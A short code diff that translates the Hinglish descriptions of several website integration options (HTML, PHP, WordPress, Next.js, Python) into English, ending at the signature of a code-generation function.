-  { id: "html",      label: "HTML Script Tag",       ext: "html",  lang: "html",       icon: "html5",    desc: "Har website ke liye — <head> mein paste karo" },
-  { id: "js",        label: "JavaScript File",        ext: "js",    lang: "javascript", icon: "brand-javascript", desc: "Alag .js file — CDN ya server par upload karo" },
-  { id: "php_inline",label: "PHP Inline",             ext: "php",   lang: "php",        icon: "brand-php", desc: "PHP file ke top mein paste karo" },
-  { id: "php_file",  label: "PHP File (Upload)",      ext: "php",   lang: "php",        icon: "brand-php", desc: "tfp-filter.php upload karo, require_once karo" },
-  { id: "wordpress", label: "WordPress Plugin",       ext: "php",   lang: "php",        icon: "brand-wordpress", desc: "Plugin install karo — no coding needed" },
-  { id: "nextjs",    label: "Next.js Middleware",     ext: "ts",    lang: "typescript", icon: "brand-nextjs", desc: "middleware.ts — Next.js projects ke liye" },
-  { id: "python",    label: "Python (Flask/Django)",  ext: "py",    lang: "python",     icon: "brand-python", desc: "Flask before_request ya Django middleware" },
+  { id: "html",      label: "HTML Script Tag",      ext: "html", lang: "html",       icon: "html5",            desc: "Any website — paste one line in <head>" },
+  { id: "js",        label: "JavaScript File",       ext: "js",   lang: "javascript", icon: "brand-javascript", desc: "Host on CDN, load with <script src>" },
+  { id: "php_inline",label: "PHP Inline",            ext: "php",  lang: "php",        icon: "brand-php",        desc: "Paste at top of PHP file" },
+  { id: "php_file",  label: "PHP File",              ext: "php",  lang: "php",        icon: "brand-php",        desc: "Upload tfp-filter.php, require_once it" },
+  { id: "wordpress", label: "WordPress Plugin",      ext: "php",  lang: "php",        icon: "brand-wordpress",  desc: "Zip and install as WP plugin" },
+  { id: "nextjs",    label: "Next.js Middleware",    ext: "ts",   lang: "typescript", icon: "brand-nextjs",     desc: "Edge middleware for Next.js projects" },
+  { id: "python",    label: "Python (Flask/Django)", ext: "py",   lang: "python",     icon: "brand-python",     desc: "Flask before_request or Django middleware" },
 ]
 
 export function generateCode(variant: string, website: WebsiteConfig, appUrl: string): string {
